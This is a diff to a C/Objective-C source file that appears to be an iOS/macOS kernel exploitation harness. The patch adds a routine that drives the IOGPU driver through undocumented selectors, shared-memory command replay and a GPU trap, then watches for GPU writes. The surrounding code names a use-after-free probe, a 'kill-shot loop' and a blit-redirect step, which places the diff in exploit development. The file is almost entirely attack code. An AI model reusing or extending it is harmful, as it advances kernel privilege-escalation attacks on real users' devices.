@@ -13400,6 +13400,185 @@ static void p_mtlreplay(void) {
     LOG("[mtlr] done (alive)");
 }
 
+
+// V84: notification-queue diagnostics (IOGPU.framework reverse, macOS 27).
+extern mach_port_t mach_reply_port(void);   // present in libsystem, hidden in iOS SDK headers
+// Matrix {nq entrySize 0x10/0x28} x {trap entrySize 0x30/0x40} on the
+// capture-faithful FULL config. Polls the nq data queue for 0x28-byte
+// completion records {u64, u64 startTime, u64 endTime, u32 status @+0x18}.
+static NSData *g_mtlr_a0, *g_mtlr_a1, *g_mtlr_a2;
+static int mtlr_assets(void) {
+    static int tried = 0;
+    if (tried) return g_mtlr_a0 != nil;
+    tried = 1;
+    NSBundle *mb = [NSBundle mainBundle];
+    NSString *p0 = [mb pathForResource:@"res0_metacache" ofType:@"bin"];
+    NSString *p1 = [mb pathForResource:@"res1_dest" ofType:@"bin"];
+    NSString *p2 = [mb pathForResource:@"res2_pool" ofType:@"bin"];
+    g_mtlr_a0 = p0 ? [NSData dataWithContentsOfFile:p0] : nil;
+    g_mtlr_a1 = p1 ? [NSData dataWithContentsOfFile:p1] : nil;
+    g_mtlr_a2 = p2 ? [NSData dataWithContentsOfFile:p2] : nil;
+    return g_mtlr_a0.length == 0x10000 && g_mtlr_a1.length == 0x10000 && g_mtlr_a2.length == 0x20000;
+}
+
+static void p_mtlreplay2(void) {
+    LOG("[mtlr2] v84 matrix: {nq entrySize} x {trap entrySize}, capture-faithful");
+    if (!mtlr_assets()) { LOG("[mtlr2] assets missing, abort"); return; }
+    static const uint64_t nqSizes[]   = { 0x10, 0x28 };
+    static const uint64_t trapSizes[] = { 0x30, 0x40 };
+    const uint64_t BSZ = 0x10000;
+    for (unsigned cell = 0; cell < sizeof(nqSizes)/sizeof(nqSizes[0]); cell++) {
+        uint64_t nqES = nqSizes[cell];
+        io_connect_t c = open_service("IOGPU", 1);
+        if (!c) { LOG("[mtlr2] nq%llx: open fail", nqES); continue; }
+        uint8_t *in = must_map(0x2000);
+        uint8_t *out = must_map(0x1000);
+        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+        uint64_t a14[2] = { 0x100, nqES };
+        size_t osz = 0x10;
+        kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+        uint64_t nqVA = *(uint64_t *)out;
+        uint32_t nqid = *(uint32_t *)(out + 8);
+        LOG("[mtlr2] sel14 {0x100, 0x%llx} -> kr 0x%08x nqVA %llx nqid %u osz 0x%zx",
+            nqES, kr, nqVA, nqid, osz);
+        // queue create blob + procName @+0x000, priority=2 @+0x400
+        memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+        const char *pn = getprogname();
+        strncpy((char *)in, pn, 0x1f);
+        *(uint32_t *)(in + 0x400) = 2;
+        osz = 0x10; nosc = 0;
+        kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+        uint64_t qid = *(uint64_t *)out;
+        uint64_t a24[2] = { qid, nqid };
+        kern_return_t kb = IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL);
+        kern_return_t kn = IOConnectSetNotificationPort(c, 0, mach_reply_port(), nqid);
+        LOG("[mtlr2] queue: kr 0x%08x qid %llu bind 0x%08x notifport 0x%08x proc '%s'",
+            kr, qid, kb, kn, pn);
+        if (!qid || kb) { IOServiceClose(c); continue; }
+
+        uint64_t gpuvaA = 0, gpuvaB = 0, gpuvaC = 0;
+        uint8_t *cpuA = NULL, *cpuB = NULL, *cpuC = NULL;
+        uint32_t ridA = gpu_resource2(c, BSZ, &gpuvaA, &cpuA);
+        uint32_t ridB = gpu_resource2(c, BSZ, &gpuvaB, &cpuB);
+        uint32_t ridC = gpu_resource2(c, 0x20000, &gpuvaC, &cpuC);
+        if (!ridA || !ridB || !ridC || !cpuA || !cpuB || !cpuC) {
+            LOG("[mtlr2] resources failed %u %u %u", ridA, ridB, ridC);
+            IOServiceClose(c); continue;
+        }
+        memcpy(cpuA, [g_mtlr_a0 bytes], BSZ);
+        memcpy(cpuB, [g_mtlr_a1 bytes], BSZ);
+        memcpy(cpuC, [g_mtlr_a2 bytes], 0x20000);
+        LOG("[mtlr2] GPUVA A %llx B %llx C %llx (capture match %d/%d/%d)",
+            gpuvaA, gpuvaB, gpuvaC,
+            gpuvaA == 0x10000000000ULL, gpuvaB == 0x10000018000ULL, gpuvaC == 0x10000030000ULL);
+
+        uint8_t *vaSeg, *vaCmd;
+        uint32_t idSeg = gpu_shmem_t(c, 0x4000, 0, &vaSeg);
+        uint32_t idCmd = gpu_shmem_t(c, 0x4000, 1, &vaCmd);
+        if (!idSeg || !idCmd) { IOServiceClose(c); continue; }
+        // kernel-written shmem headers, before any writes
+        uint64_t *sq = (uint64_t *)vaSeg, *hq = (uint64_t *)vaCmd;
+        LOG("[mtlr2] seg hdr: %016llx %016llx %016llx %016llx", sq[0], sq[1], sq[2], sq[3]);
+        LOG("[mtlr2]          %016llx %016llx %016llx %016llx", sq[4], sq[5], sq[6], sq[7]);
+        LOG("[mtlr2] cmd hdr: %016llx %016llx %016llx %016llx", hq[0], hq[1], hq[2], hq[3]);
+        LOG("[mtlr2]          %016llx %016llx %016llx %016llx", hq[4], hq[5], hq[6], hq[7]);
+        volatile uint8_t *nq = (volatile uint8_t *)(uintptr_t)nqVA;
+        if (nqVA) {
+            LOG("[mtlr2] nq base: %016llx %016llx %016llx %016llx",
+                *(volatile uint64_t *)(nq + 0x00), *(volatile uint64_t *)(nq + 0x08),
+                *(volatile uint64_t *)(nq + 0x10), *(volatile uint64_t *)(nq + 0x18));
+        }
+        uint8_t *entry = must_map(0x1000);
+        uint32_t *outw = (uint32_t *)must_map(0x100);
+        uint8_t *comp = must_map(0x1000);
+        size_t nqScan = (size_t)(0x100 * nqES);
+        if (nqScan > 0x4000) nqScan = 0x4000;
+
+        for (unsigned t = 0; t < sizeof(trapSizes)/sizeof(trapSizes[0]); t++) {
+            uint64_t tSz = trapSizes[t];
+            memcpy(vaCmd, agx_A4_image, 0x4000);         // verbatim if GPUVAs match
+            if (gpuvaB != 0x10000018000ULL) {
+                for (long o = 0; o < 0x1000 - 8; o += 4) {
+                    uint64_t q = *(uint64_t *)(vaCmd + o);
+                    if ((q >> 32) == 0x100) {
+                        if ((q & 0xffffffff) == 0x18000) *(uint64_t *)(vaCmd + o) = gpuvaB;
+                        else *(uint64_t *)(vaCmd + o) = gpuvaA + (q & 0x3fff);
+                    }
+                }
+            }
+            memcpy(vaSeg, agx_B4_image, 0x4000);
+            *(uint32_t *)(vaSeg + 0x40) = 3;             // numResources
+            *(uint32_t *)(vaSeg + 0x44) = 1;             // numResourceGroups
+            uint8_t *g6 = vaSeg + 0x48;
+            memset(g6, 0, 0x40);
+            *(uint32_t *)(g6 + 0x00) = ridA;
+            *(uint32_t *)(g6 + 0x04) = ridB;
+            *(uint32_t *)(g6 + 0x08) = ridC;
+            *(uint32_t *)(g6 + 0x18) = (uint32_t)(BSZ >> 10);
+            *(uint32_t *)(g6 + 0x1c) = (uint32_t)(BSZ >> 10);
+            *(uint32_t *)(g6 + 0x20) = (uint32_t)(0x20000 >> 10);
+            *(uint16_t *)(g6 + 0x30) = 3;
+            *(uint16_t *)(g6 + 0x32) = 3;
+            *(uint16_t *)(g6 + 0x34) = 3;
+            *(uint16_t *)(g6 + 0x3e) = 3;
+            memset(entry, 0, 0x1000);
+            *(uint32_t *)(entry + 0x00) = idCmd;
+            *(uint32_t *)(entry + 0x04) = idSeg;
+            *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;
+            *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
+            *outw = 0xdeadbeef;
+            memset(cpuB, 0, BSZ);
+            memset(comp, 0, 0x1000);
+            kern_return_t kt = ioconnect_trap4(c, 0, qid, tSz, (uintptr_t)entry, (uintptr_t)outw);
+            // poll ~5ms: completion records in nq data queue + write check on B
+            long recOff = -1; uint32_t recStatus = 0;
+            uint64_t r0 = 0, r1 = 0, r2 = 0, r3 = 0;
+            long nz = 0, f5 = 0;
+            for (int w = 0; w < 10; w++) {
+                usleep(500);
+                if (nqVA && recOff < 0) {
+                    for (size_t o = 0; o + 8 <= nqScan; o += (size_t)nqES) {
+                        uint64_t q0 = *(volatile uint64_t *)(nq + o);
+                        if (q0) {
+                            recOff = (long)o;
+                            r0 = q0;
+                            r1 = *(volatile uint64_t *)(nq + o + 0x08);
+                            r2 = *(volatile uint64_t *)(nq + o + 0x10);
+                            if (o + 0x1c <= nqScan) {
+                                r3 = *(volatile uint64_t *)(nq + o + 0x18);
+                                recStatus = *(volatile uint32_t *)(nq + o + 0x18);
+                            }
+                            break;
+                        }
+                    }
+                }
+                if (!nz && cpuB[0]) break;
+            }
+            for (long i = 0; i < (long)BSZ; i += 0x40) {
+                if (cpuB[i]) nz++;
+                if (cpuB[i] == 0x5A) f5++;
+            }
+            LOG("[mtlr2] nq%02llx/trap%02llx -> kr 0x%08x outU32 %08x | rec off %ld status 0x%08x | B(sampled) nz %ld 5A %ld %s",
+                nqES, tSz, kt, *outw, recOff, recStatus, nz, f5, nz ? "GPU WRITE OBSERVED!" : "");
+            if (recOff >= 0)
+                LOG("[mtlr2]   rec@%lx: %016llx %016llx %016llx %016llx", recOff, r0, r1, r2, r3);
+            if (nqVA) {
+                // full dump of queue head + first records (stride observed: 0x2c)
+                for (int off = 0; off < 0x100; off += 0x10)
+                    LOG("[mtlr2]   nq+%03x: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
+                        off, nq[off+0], nq[off+1], nq[off+2], nq[off+3], nq[off+4], nq[off+5],
+                        nq[off+6], nq[off+7], nq[off+8], nq[off+9], nq[off+10], nq[off+11],
+                        nq[off+12], nq[off+13], nq[off+14], nq[off+15]);
+            }
+            uint64_t *cq = (uint64_t *)comp;
+            LOG("[mtlr2]   comp: %016llx %016llx | comp+30: %016llx %016llx | outw[1] %08x",
+                cq[0], cq[1], cq[6], cq[7], outw[1]);
+        }
+        IOServiceClose(c);
+    }
+    LOG("[mtlr2] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -13530,7 +13709,9 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
-        p_mtlreplay();      // v83: Metal-format replay (format-B resources + 6-pack seglist) FIRST
+        p_mtlreplay2();     // v84: nq diagnostics matrix FIRST
+        if (getenv("FUZZ_MTLR_ONLY")) { LOG("[probe13] mtlr-only mode, stop"); return NULL; }
+        p_mtlreplay();      // v83: Metal-format replay (format-B resources + 6-pack seglist)
         p_gpuwrite();       // v80: GPUVA-correct blit redirect FIRST
         p_killshot_only();  // v79: isolated kill-shot loop FIRST
         p_blithit();        // v76: blit + prepared resource sweep
